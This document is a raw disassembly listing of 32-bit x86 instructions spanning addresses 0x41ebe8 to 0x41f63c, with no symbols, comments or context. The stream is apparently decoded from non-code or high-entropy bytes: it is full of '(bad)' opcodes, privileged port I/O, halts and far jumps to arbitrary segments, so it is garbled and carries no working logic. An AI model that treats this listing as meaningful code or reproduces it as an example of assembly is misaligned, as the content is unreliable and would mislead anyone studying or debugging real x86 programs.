  41ebe8:	aad    0x92
  41ebea:	xchg   ecx,eax
  41ebeb:	enter  0xfbb,0x61
  41ebef:	jbe    0x41eb9c
  41ebf1:	jg     0x41ec0b
  41ebf3:	adc    DWORD PTR [ebx],ecx
  41ebf5:	jne    0x41ec5c
  41ebf7:	sti    
  41ebf8:	retf   0x2ba9
  41ebfb:	mov    cl,0x3c
  41ebfd:	rcr    DWORD PTR [ebp-0x58bfc158],0xca
  41ec04:	xchg   edx,eax
  41ec05:	xchg   edi,eax
  41ec06:	pop    eax
  41ec07:	ja     0x41ec25
  41ec09:	out    dx,eax
  41ec0a:	out    0xcc,eax
  41ec0c:	fisttp DWORD PTR [ebx-0x7beffe2a]
  41ec12:	loope  0x41ec16
  41ec14:	int    0x79
  41ec16:	into   
  41ec17:	push   esp
  41ec18:	mov    eax,DWORD PTR [edx]
  41ec1a:	sub    eax,0xa5e7b480
  41ec1f:	js     0x41ebb6
  41ec21:	into   
  41ec22:	push   ds
  41ec23:	sahf   
  41ec24:	cwde   
  41ec25:	imul   esi,DWORD PTR [eax+0x39da56a1],0xffffff88
  41ec2c:	push   eax
  41ec2d:	rcr    dh,cl
  41ec2f:	iret   
  41ec30:	cmp    ch,al
  41ec32:	jne    0x41ebfc
  41ec34:	aad    0x46
  41ec36:	hlt    
  41ec37:	push   edi
  41ec38:	cmp    DWORD PTR [ebx],ebp
  41ec3a:	lock nop
  41ec3c:	adc    ah,bh
  41ec3e:	(bad)  
  41ec3f:	sbb    al,0x7e
  41ec41:	shr    dh,0x79
  41ec44:	call   0x8c02:0x24ffea16
  41ec4b:	mov    BYTE PTR [edx],al
  41ec4d:	cmc    
  41ec4e:	popf   
  41ec4f:	xchg   edx,eax
  41ec50:	add    eax,0x1efa510
  41ec55:	mov    ds:0x1aff08c1,al
  41ec5a:	mov    esp,0xc75a5e34
  41ec5f:	imul   edx,DWORD PTR [ebx+eiz*4+0x8c0abcd],0x8ae173b1
  41ec6a:	ins    DWORD PTR es:[edi],dx
  41ec6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6c:	shl    ecx,1
  41ec6e:	sbb    eax,DWORD PTR [ebx]
  41ec70:	mov    eax,ds:0x583e23f3
  41ec75:	pop    ecx
  41ec76:	cmp    edx,edx
  41ec78:	enter  0x6e52,0x53
  41ec7c:	fadd   DWORD PTR [ebx-0x55993a71]
  41ec82:	(bad)  
  41ec83:	jl     0x41ec5f
  41ec85:	sbb    edx,DWORD PTR ds:0x6777ce04
  41ec8c:	mov    dh,0xe7
  41ec8e:	(bad)  
  41ec8f:	sbb    ah,BYTE PTR [edx-0x430262a7]
  41ec95:	lds    ecx,FWORD PTR [ebp-0x5c808fea]
  41ec9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec9c:	or     ch,BYTE PTR [edi-0x54816089]
  41eca2:	adc    ebp,esp
  41eca4:	dec    eax
  41eca5:	iret   
  41eca6:	push   es
  41eca7:	xchg   bl,bl
  41eca9:	sahf   
  41ecaa:	mov    ebx,0x3bbe6bf2
  41ecaf:	sbb    eax,0xafa0590f
  41ecb4:	add    DWORD PTR [esp+ecx*1-0x664badfb],eax
  41ecbb:	sti    
  41ecbc:	mov    bh,ah
  41ecbe:	pop    ecx
  41ecbf:	push   edx
  41ecc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41ed31:	add    BYTE PTR [eax],al
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	jmp    0x41ecf0
  41ed42:	jmp    0x41ecdd
  41ed44:	dec    BYTE PTR [edx+0x1]
  41ed47:	add    ch,dh
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    cl,ch
  41ed4d:	cmp    BYTE PTR [esi+0x1b189200],bl
  41ed53:	hlt    
  41ed54:	adc    DWORD PTR [eax+0x50],ebp
  41ed57:	add    ebx,DWORD PTR [edi+0x34]
  41ed5a:	mov    bx,WORD PTR [edx+eax*2]
  41ed5e:	xchg   edx,eax
  41ed5f:	pop    ebp
  41ed60:	push   es
  41ed61:	dec    ebx
  41ed62:	xor    al,0xe4
  41ed64:	sub    DWORD PTR [edi+ebx*4],edx
  41ed67:	jmp    0x41eced
  41ed69:	push   cs
  41ed6a:	mov    dh,0xba
  41ed6c:	adc    edx,eax
  41ed6e:	ss into 
  41ed70:	lea    edi,[ebx+0x44f4b015]
  41ed76:	jno    0x41ed25
  41ed78:	pop    ecx
  41ed79:	mov    ch,0x37
  41ed7b:	pop    eax
  41ed7c:	mov    dl,0xee
  41ed7e:	or     eax,0xaeeeb3e6
  41ed83:	sbb    edi,ebx
  41ed85:	(bad)  
  41ed86:	sub    al,0x92
  41ed88:	jne    0x41eda1
  41ed8a:	xlat   BYTE PTR ds:[ebx]
  41ed8b:	push   0x6c2838d0
  41ed90:	scas   eax,DWORD PTR es:[edi]
  41ed91:	int3   
  41ed92:	shl    DWORD PTR [esi],1
  41ed94:	inc    edi
  41ed95:	(bad)  
  41ed96:	jl     0x41ed7f
  41ed98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed99:	popa   
  41ed9a:	in     eax,0xa8
  41ed9c:	fsub   QWORD PTR [edi-0x6b]
  41ed9f:	mov    bl,0xec
  41eda1:	mov    DWORD PTR [ebp-0x1bcb6440],esi
  41eda7:	dec    ecx
  41eda8:	mov    ds:0x87b9bf0d,eax
  41edad:	nop
  41edae:	fimul  DWORD PTR [esi]
  41edb0:	mov    ebx,0x7e0fee7a
  41edb5:	cmp    cl,BYTE PTR [edx-0x5879f61d]
  41edbb:	imul   BYTE PTR ss:[ebp+eiz*4+0x110ff7ef]
  41edc3:	aaa    
  41edc4:	stc    
  41edc5:	mov    esp,0x860c3ad2
  41edca:	pop    esp
  41edcb:	mov    ds:0xf0d09714,eax
  41edd0:	sub    al,0x6b
  41edd2:	xor    DWORD PTR [esi-0x4ff381df],esp
  41edd8:	push   es
  41edd9:	mov    ebx,0x974ebf1d
  41edde:	out    dx,al
  41eddf:	cmp    eax,0xc3b525b5
  41ede4:	jns    0x41ed9f
  41ede6:	sub    eax,0x8df24721
  41edeb:	or     eax,0x85fc448f
  41edf0:	cmp    ecx,DWORD PTR ds:0xa076b72e
  41edf6:	jmp    0x3dbf6066
  41edfb:	push   ss
  41edfc:	scas   eax,DWORD PTR es:[edi]
  41edfd:	in     al,0xa7
  41edff:	sti    
  41ee00:	dec    ebp
  41ee01:	test   eax,0x3829fc2
  41ee06:	sub    DWORD PTR [eax-0x2939705f],esi
  41ee0c:	loopne 0x41ee2a
  41ee0e:	pop    ss
  41ee0f:	add    edx,DWORD PTR [eax+0x70]
  41ee12:	es pop ecx
  41ee14:	xchg   bh,cl
  41ee16:	xchg   ecx,ebp
  41ee18:	jb     0x41ee79
  41ee1a:	mov    ebp,0x96d758ae
  41ee1f:	xor    eax,0x8a2a712d
  41ee24:	sbb    ebp,esp
  41ee26:	mov    BYTE PTR [ebp-0x1],0xbd
  41ee2a:	call   0x42d3:0xbf637f65
  41ee31:	pop    ss
  41ee32:	xchg   edx,eax
  41ee33:	sahf   
  41ee34:	xor    dl,BYTE PTR [esi+0x7e]
  41ee37:	add    BYTE PTR [edx-0x14fb6fad],cl
  41ee3d:	or     BYTE PTR [eax+0x2e],bl
  41ee40:	mov    BYTE PTR [eax],0x0
	...
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	add    BYTE PTR [ebx+0xf],cl
  41eec3:	and    bl,dh
  41eec5:	dec    ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    bh,bh
  41eecd:	pop    ds
  41eece:	nop
  41eecf:	(bad)  
  41eed1:	ror    BYTE PTR [edx-0x34],1
  41eed4:	ret    0x7251
  41eed7:	add    dl,dl
  41eed9:	and    eax,0xe4fc104f
  41eede:	inc    ebp
  41eedf:	outs   dx,DWORD PTR ds:[esi]
  41eee0:	or     eax,DWORD PTR [esi]
  41eee2:	or     dh,BYTE PTR [eax]
  41eee4:	test   BYTE PTR [ecx+0x2d],dh
  41eee7:	cmc    
  41eee8:	pop    DWORD PTR ds:0x556fe71a
  41eeee:	jmp    0x1f370e6
  41eef3:	mov    cl,0x6a
  41eef5:	inc    edx
  41eef6:	pop    ss
  41eef7:	mov    ebx,0xefcc0cf8
  41eefc:	frstor [eax+edi*2+0x6130325f]
  41ef03:	cmp    DWORD PTR [ebx],esp
  41ef05:	sar    DWORD PTR [edi+0x6a],1
  41ef08:	mov    ah,0x56
  41ef0a:	int    0x72
  41ef0c:	fsub   st,st(5)
  41ef0e:	cdq    
  41ef0f:	cmp    bh,BYTE PTR [ebx+ebx*4-0x45]
  41ef13:	mov    dl,0xbb
  41ef15:	pop    ds
  41ef16:	pop    ebx
  41ef17:	dec    esp
  41ef18:	xor    al,0x4c
  41ef1a:	out    0xe4,eax
  41ef1c:	jno    0x41ef49
  41ef1e:	into   
  41ef1f:	push   es
  41ef20:	dec    eax
  41ef21:	sti    
  41ef22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef23:	and    ch,BYTE PTR ds:0x672f4afe
  41ef29:	ins    BYTE PTR es:[edi],dx
  41ef2a:	pop    es
  41ef2b:	push   edx
  41ef2c:	in     al,0x31
  41ef2e:	add    al,0xf5
  41ef30:	icebp  
  41ef31:	xor    DWORD PTR [edx],ecx
  41ef33:	or     BYTE PTR [esi],bh
  41ef35:	icebp  
  41ef36:	in     eax,0x3e
  41ef38:	enter  0x1206,0x6a
  41ef3c:	push   0x17
  41ef3e:	repnz fldenv [ebx]
  41ef41:	mov    dh,0xaa
  41ef43:	mov    DWORD PTR [edi],ebx
  41ef45:	aaa    
  41ef46:	pop    eax
  41ef47:	aam    0x49
  41ef49:	pusha  
  41ef4a:	sti    
  41ef4b:	(bad)  
  41ef4c:	jns    0x41ef1a
  41ef4e:	adc    ch,BYTE PTR [edx-0x2975fd44]
  41ef54:	push   0x9b1ab382
  41ef59:	call   0x9cc3:0x447cd256
  41ef60:	jo     0x41ef61
  41ef62:	xor    al,0x19
  41ef64:	push   ds
  41ef65:	sub    al,dl
  41ef67:	sub    cl,bh
  41ef69:	jns    0x41ef34
  41ef6b:	mov    eax,0xa43bf2f2
  41ef70:	adc    dl,BYTE PTR [ebx+0x16562191]
  41ef76:	inc    edi
  41ef77:	cmp    DWORD PTR [esp+esi*2],ebx
  41ef7a:	ds pop ebp
  41ef7c:	fstp   TBYTE PTR [esi+0x25]
  41ef7f:	push   0x7098f9d0
  41ef84:	sub    DWORD PTR [edi+0x5cddcdcc],edi
  41ef8a:	mov    ds:0xcced4008,al
  41ef8f:	sub    DWORD PTR [ebp+0x5108c699],ebx
  41ef95:	lock ror DWORD PTR [ecx-0x58],cl
  41ef99:	adc    dh,BYTE PTR [esi+esi*2-0x1f]
  41ef9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef9e:	(bad)  
  41ef9f:	cli    
  41efa0:	inc    edx
  41efa1:	or     eax,0x9ffcb0ec
  41efa6:	pop    ss
  41efa7:	cmp    DWORD PTR [ebx+0x14],edx
  41efaa:	xchg   esp,eax
  41efab:	push   ds
  41efac:	xchg   ebx,eax
  41efad:	xchg   ebp,eax
  41efae:	fcom   DWORD PTR cs:[edx+0x47]
  41efb2:	out    dx,eax
  41efb3:	ficomp DWORD PTR [ecx+0x6a]
  41efb6:	mov    ecx,0x7021e7d3
  41efbb:	inc    esp
  41efbc:	pop    ebx
  41efbd:	enter  0xfb6,0xb3
	...
  41f031:	add    BYTE PTR [eax],al
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x5f]
  41f041:	ins    BYTE PTR es:[edi],dx
  41f042:	dec    esi
  41f043:	sbb    ebp,eax
  41f045:	dec    esp
  41f046:	add    DWORD PTR [eax],eax
  41f048:	cmc    
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    bl,dl
  41f04d:	int    0x24
  41f04f:	es aad 0xe1
  41f052:	mov    eax,0x10a69598
  41f057:	shr    BYTE PTR [esi+0x45d120ac],1
  41f05d:	sub    al,0x64
  41f05f:	push   es
  41f060:	loop   0x41f0c5
  41f062:	js     0x41f04a
  41f064:	xor    eax,0x44cf9c17
  41f069:	js     0x41f05d
  41f06b:	shl    BYTE PTR [ebp+0x7a7e276e],cl
  41f071:	add    DWORD PTR [ebx+0x21],0x71274032
  41f078:	cmp    DWORD PTR ds:0x474de78c,eax
  41f07e:	test   dh,bl
  41f080:	stos   DWORD PTR es:[edi],eax
  41f081:	push   cs
  41f082:	sbb    edx,DWORD PTR [ebx-0x6efcdc61]
  41f088:	fsubp  st(3),st
  41f08a:	test   al,0xd
  41f08c:	dec    ebp
  41f08d:	cwde   
  41f08e:	shl    edx,cl
  41f090:	bound  ecx,QWORD PTR [esi]
  41f092:	cmp    cl,bl
  41f094:	jle    0x41f02c
  41f096:	push   ss
  41f097:	push   es
  41f098:	xchg   ecx,eax
  41f099:	or     BYTE PTR [edi],dl
  41f09b:	outs   dx,BYTE PTR ds:[esi]
  41f09c:	sbb    eax,0x217a8ff6
  41f0a1:	lods   eax,DWORD PTR ds:[esi]
  41f0a2:	scas   eax,DWORD PTR es:[edi]
  41f0a3:	jg     0x41f0b7
  41f0a5:	push   ebx
  41f0a6:	fnstcw WORD PTR fs:[ebx]
  41f0a9:	paddusw mm0,QWORD PTR [ecx+ebp*4+0x50b62758]
  41f0b1:	xchg   BYTE PTR [edi-0x518d8422],al
  41f0b7:	pop    edx
  41f0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b9:	or     al,BYTE PTR ds:0x773911a2
  41f0bf:	mov    ds:0xc9f8bee6,eax
  41f0c4:	mov    ds:0x31d00976,al
  41f0c9:	mov    bh,0x71
  41f0cb:	daa    
  41f0cc:	push   0x66
  41f0ce:	cmp    DWORD PTR [ebx-0x4],esi
  41f0d1:	imul   esp,edx,0x3d
  41f0d4:	sbb    al,0xf4
  41f0d6:	adc    bl,BYTE PTR [ebx+0x7e]
  41f0d9:	lahf   
  41f0da:	shl    esi,cl
  41f0dc:	sahf   
  41f0dd:	shl    DWORD PTR [edi],1
  41f0df:	das    
  41f0e0:	(bad)  
  41f0e1:	out    dx,al
  41f0e2:	fs adc al,0xd7
  41f0e5:	aaa    
  41f0e6:	retf   0x9c71
  41f0e9:	dec    ebx
  41f0ea:	mov    ah,0x32
  41f0ec:	sub    eax,0xf4e74632
  41f0f1:	xchg   cl,ch
  41f0f3:	mov    BYTE PTR [edx],bh
  41f0f5:	mov    dl,0x76
  41f0f7:	shl    BYTE PTR [ecx+0x6c],1
  41f0fa:	enter  0x7b81,0x74
  41f0fe:	call   0x9439465d
  41f103:	cdq    
  41f104:	xor    edi,DWORD PTR [edi+0x7c]
  41f107:	push   ebx
  41f108:	and    eax,0xd0c6e355
  41f10d:	pop    ss
  41f10e:	sub    edi,esp
  41f110:	retf   
  41f111:	mov    eax,0xc85bd62e
  41f116:	fcos   
  41f118:	mov    WORD PTR [eax+edi*4],fs
  41f11b:	in     al,dx
  41f11c:	jo     0x41f0c2
  41f11e:	cld    
  41f11f:	dec    ebx
  41f120:	jae    0x41f170
  41f122:	xor    DWORD PTR [ebp+0x34],0x26
  41f126:	lahf   
  41f127:	(bad)  
  41f128:	cmp    eax,ecx
  41f12a:	mov    dh,0x52
  41f12c:	maxps  xmm0,xmm0
  41f12f:	pop    DWORD PTR [esi+0x5086639d]
  41f135:	and    al,0xcf
  41f137:	mov    ebx,0x7d883368
  41f13c:	ins    BYTE PTR es:[edi],dx
  41f13d:	push   ebx
  41f13e:	sar    BYTE PTR [ecx],0xde
	...
  41f1b1:	add    BYTE PTR [eax],al
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [ebp+0x75],esi
  41f1c2:	mov    dh,0x32
  41f1c4:	fisttp QWORD PTR [ebp+0x1]
  41f1c7:	add    ch,dh
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [eax+0x6c10120a],ch
  41f1d1:	add    BYTE PTR [esi],ah
  41f1d3:	xchg   DWORD PTR [eax-0x8],esp
  41f1d6:	pop    edi
  41f1d7:	mov    eax,0xfcd721e7
  41f1dc:	jo     0x41f22a
  41f1de:	idiv   DWORD PTR [esp+eax*8]
  41f1e1:	mov    cl,0x71
  41f1e3:	lea    ax,cs:[esi+0x46b3d6dd]
  41f1eb:	cdq    
  41f1ec:	cmp    BYTE PTR [ebx-0x3c],bl
  41f1ef:	sub    dh,BYTE PTR [edi+edi*2-0x772b6b5c]
  41f1f6:	hlt    
  41f1f7:	add    al,bh
  41f1f9:	pop    ebx
  41f1fa:	add    ch,BYTE PTR [ebx+0x585102f4]
  41f200:	inc    ebx
  41f201:	gs pop esp
  41f203:	push   edi
  41f204:	pushf  
  41f205:	sbb    eax,DWORD PTR [esi+0x65a060bc]
  41f20b:	call   0x6fb2:0x17739c76
  41f212:	mov    edx,0xf61c7bec
  41f217:	call   0x9dda31dd
  41f21c:	lods   al,BYTE PTR ds:[esi]
  41f21d:	jp     0x41f1b1
  41f21f:	out    dx,al
  41f220:	clc    
  41f221:	out    0x33,al
  41f223:	adc    edx,edi
  41f225:	pop    ebp
  41f226:	pop    esp
  41f227:	rol    DWORD PTR [ecx],0x2f
  41f22a:	test   eax,0xf173ece1
  41f22f:	mov    cl,BYTE PTR [edi]
  41f231:	dec    ecx
  41f232:	dec    al
  41f234:	xchg   ebp,eax
  41f235:	fdivp  st(6),st
  41f237:	push   ecx
  41f238:	push   es
  41f239:	sar    ah,cl
  41f23b:	xchg   edi,eax
  41f23c:	pop    edi
  41f23d:	ins    BYTE PTR es:[edi],dx
  41f23e:	push   0x66
  41f240:	sbb    DWORD PTR [esi],ebx
  41f242:	dec    DWORD PTR [esi-0x20]
  41f245:	lods   al,BYTE PTR ds:[esi]
  41f246:	or     BYTE PTR [edi-0x20],al
  41f249:	cmp    DWORD PTR [esi+0x49cf0195],eax
  41f24f:	fistp  QWORD PTR [esi]
  41f251:	jne    0x41f1f6
  41f253:	in     eax,0x9f
  41f255:	fidiv  WORD PTR ds:0xf42b6705
  41f25b:	ins    DWORD PTR es:[edi],dx
  41f25c:	and    BYTE PTR ds:0x40cac62a,0x96
  41f263:	add    BYTE PTR [esi-0x2dee8e8b],bl
  41f269:	jmp    0x41f277
  41f26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f26c:	in     eax,0x73
  41f26e:	lock jle 0x41f2a7
  41f271:	inc    esi
  41f272:	out    dx,eax
  41f273:	std    
  41f274:	adc    BYTE PTR [edi+0x2],al
  41f277:	fst    st(0)
  41f279:	rcl    DWORD PTR [ecx+esi*2],0xee
  41f27d:	push   esi
  41f27e:	les    ebp,FWORD PTR [esi]
  41f280:	adc    eax,0x6d571cf
  41f285:	xchg   DWORD PTR [ecx],edi
  41f287:	sti    
  41f288:	cdq    
  41f289:	push   esi
  41f28a:	retf   
  41f28b:	enter  0xb68f,0x1
  41f28f:	xlat   BYTE PTR ds:[ebx]
  41f290:	and    eax,0xa32354e9
  41f295:	cli    
  41f296:	add    DWORD PTR [ebp-0x1d],0xfffffff7
  41f29a:	dec    eax
  41f29b:	in     al,0xf7
  41f29d:	push   edi
  41f29e:	(bad)
  41f2a1:	adc    eax,0x20a8bf0e
  41f2a6:	leave  
  41f2a7:	xchg   edi,eax
  41f2a8:	fld    QWORD PTR [edi+edx*2+0x1f1572e9]
  41f2af:	popa   
  41f2b0:	jnp    0x41f2db
  41f2b2:	dec    esp
  41f2b3:	xchg   esi,eax
  41f2b4:	fld    TBYTE PTR ss:[edx+0x56ad2abc]
  41f2bb:	jns    0x41f290
  41f2bd:	mov    ebp,0x7bb7b0
	...
  41f332:	add    BYTE PTR [eax],al
  41f334:	mov    DWORD PTR [edx],edx
  41f336:	ja     0x41f357
  41f338:	(bad)  
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0xd614:0x669531a0
  41f343:	cmp    eax,0x14ed2
  41f348:	cmc    
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    dl,al
  41f34d:	popf   
  41f34e:	inc    esi
  41f34f:	xchg   ebx,eax
  41f350:	jg     0x41f3bb
  41f352:	fldenv [ebx-0x7c9f67ed]
  41f358:	out    dx,al
  41f359:	lods   al,BYTE PTR ds:[esi]
  41f35a:	dec    ebp
  41f35b:	fnsave [edx]
  41f35d:	inc    eax
  41f35e:	stos   DWORD PTR es:[edi],eax
  41f35f:	jmp    0xbada:0x65e6eb57
  41f366:	pushf  
  41f367:	test   al,0x65
  41f369:	(bad)  
  41f36a:	js     0x41f3e0
  41f36c:	loop   0x41f32b
  41f36e:	xor    esi,DWORD PTR [esi]
  41f370:	les    ebx,FWORD PTR [eax+0x82df861]
  41f376:	cmc    
  41f377:	je     0x41f3be
  41f379:	sbb    BYTE PTR [edx],0x95
  41f37c:	mov    ebp,0x19515c2d
  41f382:	addr16 mov eax,0xe4d65034
  41f388:	daa    
  41f389:	jg     0x41f3af
  41f38b:	or     DWORD PTR [eax],ecx
  41f38d:	xchg   BYTE PTR [ecx],bl
  41f38f:	leave  
  41f390:	sbb    eax,0x374a8e54
  41f395:	mov    al,ds:0x7c4c8261
  41f39a:	dec    esi
  41f39b:	mov    edx,0xe0cf3a61
  41f3a0:	push   edx
  41f3a1:	std    
  41f3a2:	xchg   ebp,eax
  41f3a3:	gs add edx,esp
  41f3a6:	fdivr  QWORD PTR [ebx-0x51]
  41f3a9:	inc    ecx
  41f3aa:	ficom  DWORD PTR [ecx-0x1b]
  41f3ad:	imul   ebx,ebp,0x7d
  41f3b0:	loope  0x41f3cb
  41f3b2:	adc    al,0xbb
  41f3b4:	and    DWORD PTR fs:[ebp-0x21],ebx
  41f3b8:	in     eax,0xa5
  41f3ba:	pop    es
  41f3bb:	push   ds
  41f3bc:	and    eax,0x799a7427
  41f3c1:	cld    
  41f3c2:	jmp    0xf42:0xfd1338d
  41f3c9:	leave  
  41f3ca:	or     ecx,DWORD PTR [ebx]
  41f3cc:	xchg   edi,eax
  41f3cd:	rcr    dl,0x37
  41f3d0:	and    eax,0x644fd238
  41f3d5:	or     BYTE PTR [ecx+0x73],ch
  41f3d8:	pop    ds
  41f3d9:	mov    bh,0x82
  41f3db:	mov    cl,0x9a
  41f3dd:	sub    eax,0x61b76cf9
  41f3e2:	das    
  41f3e3:	dec    ecx
  41f3e4:	jns    0x41f44f
  41f3e6:	push   es
  41f3e7:	push   es
  41f3e8:	arpl   dx,ax
  41f3ea:	in     al,dx
  41f3eb:	sub    al,0x18
  41f3ed:	cmp    BYTE PTR [eax],dl
  41f3ef:	push   edx
  41f3f0:	add    bh,BYTE PTR [ebp+ecx*8-0x2ac3a623]
  41f3f7:	enter  0x2149,0xed
  41f3fb:	push   ecx
  41f3fc:	mov    edi,es
  41f3fe:	std    
  41f3ff:	out    0x64,eax
  41f401:	lods   eax,DWORD PTR ds:[esi]
  41f402:	jle    0x41f414
  41f404:	icebp  
  41f405:	arpl   WORD PTR [ecx],bp
  41f407:	rcl    BYTE PTR [edx],1
  41f409:	inc    esp
  41f40a:	sti    
  41f40b:	ror    BYTE PTR [eax-0x4b],cl
  41f40e:	cld    
  41f40f:	inc    eax
  41f410:	retf   
  41f411:	cmp    edx,edi
  41f413:	out    0x4b,al
  41f415:	xor    ecx,0xffffffd8
  41f418:	dec    edx
  41f419:	shr    DWORD PTR [eax],0x1c
  41f41c:	fisubr WORD PTR [ebp-0x20]
  41f41f:	mov    ebx,0xf80a1939
  41f424:	jne    0x41f3ac
  41f426:	dec    ebp
  41f427:	mov    ch,0x21
  41f429:	fcom   st(1)
  41f42b:	nop
  41f42c:	es int3 
  41f42e:	inc    ebp
  41f42f:	outs   dx,DWORD PTR ds:[esi]
  41f430:	lods   eax,DWORD PTR ds:[esi]
  41f431:	inc    esi
  41f432:	jmp    0x6760:0xd5d01d89
  41f439:	push   esi
  41f43a:	int3   
  41f43b:	and    eax,0x68e494b6
  41f440:	cld    
	...
  41f4b1:	add    BYTE PTR [eax],al
  41f4b3:	add    BYTE PTR [eax],ah
  41f4b5:	push   0xffffffcb
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x1
  41f4c1:	push   ds
  41f4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c3:	cdq    
  41f4c4:	(bad)  
  41f4c5:	dec    edi
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	cmc    
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [eax],bl
  41f4cd:	or     ecx,DWORD PTR [eax+0x4fb34cf9]
  41f4d3:	iret   
  41f4d4:	dec    edx
  41f4d5:	fidiv  DWORD PTR [ebp+0x75]
  41f4d8:	cmp    DWORD PTR [eax+0x6fb982f0],ebp
  41f4de:	nop
  41f4df:	test   ebp,esp
  41f4e1:	mov    al,ds:0x883336cf
  41f4e6:	stos   BYTE PTR es:[edi],al
  41f4e7:	leave  
  41f4e8:	cmc    
  41f4e9:	es sub cl,bl
  41f4ec:	inc    edi
  41f4ed:	inc    ebx
  41f4ee:	jbe    0x41f4c8
  41f4f0:	pop    eax
  41f4f1:	out    dx,eax
  41f4f2:	scas   eax,DWORD PTR es:[edi]
  41f4f3:	mov    bl,0x85
  41f4f5:	push   es
  41f4f6:	sub    DWORD PTR [edx+edx*8-0x42a2414b],0xffffff83
  41f4fe:	jecxz  0x41f4f9
  41f500:	mov    ch,ch
  41f502:	jmp    0x8c97:0xac5fa7d8
  41f509:	je     0x41f4e6
  41f50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f50c:	mov    edi,0xa6c3c3e5
  41f511:	(bad)  
  41f512:	cmp    al,0x45
  41f514:	mov    cs,WORD PTR [ecx-0x986b202]
  41f51a:	sbb    DWORD PTR [edi-0x593c6b6f],esi
  41f520:	dec    ebx
  41f521:	gs je  0x41f55c
  41f524:	jecxz  0x41f4c6
  41f526:	dec    esi
  41f527:	ret    0x7e38
  41f52a:	shl    BYTE PTR [edx+0x39],cl
  41f52d:	neg    eax
  41f52f:	sbb    esi,DWORD PTR [ebp+0xd]
  41f532:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f534:	pop    ebx
  41f535:	loop   0x41f4ce
  41f537:	shr    BYTE PTR [esp+esi*2-0x60],1
  41f53b:	dec    ebx
  41f53c:	sti    
  41f53d:	mov    edi,0x8761b7f2
  41f542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f543:	aad    0x9c
  41f545:	rcl    BYTE PTR [edx+0x3a],0x5e
  41f549:	xor    eax,0x50407361
  41f54e:	js     0x41f584
  41f550:	xor    eax,0x8c0bb321
  41f555:	(bad)  
  41f556:	loop   0x41f570
  41f558:	jae    0x41f543
  41f55a:	dec    esp
  41f55b:	xchg   ebp,eax
  41f55c:	mov    ebp,0xc737d791
  41f561:	ja     0x41f5c2
  41f563:	xlat   BYTE PTR ds:[ebx]
  41f564:	ja     0x41f4e6
  41f566:	pop    ebx
  41f567:	jmp    FWORD PTR [eax]
  41f569:	leave  
  41f56a:	shr    DWORD PTR [eax],cl
  41f56c:	jno    0x41f579
  41f56e:	lods   eax,DWORD PTR ds:[esi]
  41f56f:	push   0x4d
  41f571:	jl     0x41f5d7
  41f573:	mov    edi,DWORD PTR [edx+0x151191a0]
  41f579:	shl    DWORD PTR [edx],1
  41f57b:	inc    eax
  41f57c:	pusha  
  41f57d:	call   FWORD PTR [ebp-0x63]
  41f580:	popf   
  41f581:	addr16 jmp 0xdc7877bf
  41f587:	adc    DWORD PTR [edx],edi
  41f589:	dec    edi
  41f58a:	(bad)  
  41f58b:	enter  0xfac,0xaf
  41f58f:	rol    BYTE PTR [eax+0xe],1
  41f592:	xchg   BYTE PTR [eax+0xb],dh
  41f595:	cmp    al,0x31
  41f597:	and    edx,edi
  41f599:	mov    BYTE PTR [eax-0x7ad980e3],0xac
  41f5a0:	pop    ds
  41f5a1:	mov    esp,0x45194e1f
  41f5a6:	test   DWORD PTR cs:[edi+0x73],edx
  41f5aa:	jmp    0xba79:0x58c374b2
  41f5b1:	ins    BYTE PTR es:[edi],dx
  41f5b2:	scas   eax,DWORD PTR es:[edi]
  41f5b3:	icebp  
  41f5b4:	jo     0x41f546
  41f5b6:	inc    edi
  41f5b7:	or     ch,BYTE PTR [ebp+0x1c280fb0]
  41f5bd:	jle    0x41f55c
  41f5bf:	xchg   ebp,eax
  41f5c0:	into   
	...
  41f631:	add    BYTE PTR [eax],al
  41f633:	add    ch,al
  41f635:	cwde   
  41f636:	loope  0x41f68d
  41f638:	std    
  41f639:	jge    0x41f630
  41f63b:	cwde   
  41f63c:	and    eax,0x4b01e835
